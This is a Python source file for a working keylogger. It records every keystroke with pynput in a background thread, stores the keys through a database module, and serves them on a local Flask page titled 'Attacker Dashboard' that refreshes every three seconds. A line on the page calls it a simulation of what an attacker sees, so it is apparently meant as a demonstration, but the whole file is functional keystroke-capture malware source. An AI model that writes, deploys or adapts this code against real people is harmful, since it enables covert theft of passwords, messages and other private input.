from flask import Flask, render_template_string
from pynput import keyboard
import threading
import database

app = Flask(__name__)

# --- SECTION 1: THE PYNPUT KEYLOGGER ---
def on_press(key):
    try:
        key_name = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            key_name = " [SPACE] "
        elif key == keyboard.Key.enter:
            key_name = " [ENTER] "
        else:
            key_name = f" [{key.name}] "
    
    # Save the key directly to our SQLite database
    database.save_key(key_name)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --- SECTION 2: THE FLASK WEB DASHBOARD ---
# A simple HTML template written directly into the code for easy setup
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Attacker Dashboard</title>
    <meta http-equiv="refresh" content="3"> <!-- Auto-refreshes page every 3 seconds -->
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f9; }
        h1 { color: #d9534f; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: white; }
        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #333; color: white; }
    </style>
</head>
<body>
    <h1>Intercepted Keystrokes (Database Logs)</h1>
    <p>This web panel simulates what an attacker sees remotely.</p>
    <table>
        <tr>
            <th>Timestamp</th>
            <th>Key Captured</th>
        </tr>
        {% for row in logs %}
        <tr>
            <td>{{ row[0] }}</td>
            <td><strong>{{ row[1] }}</strong></td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def index():
    # Fetch latest logs from SQLite to display on the webpage
    logs = database.get_all_keys()
    return render_template_string(HTML_TEMPLATE, logs=logs)

if __name__ == '__main__':
    # Start the keylogger in a separate background thread so Flask can run normally
    logger_thread = threading.Thread(target=start_keylogger, daemon=True)
    logger_thread.start()
    
    # Run the web server
    print("Starting Flask dashboard... Go to http://127.0.0.1:5000 in your browser.")
    app.run(port=5000, debug=False)
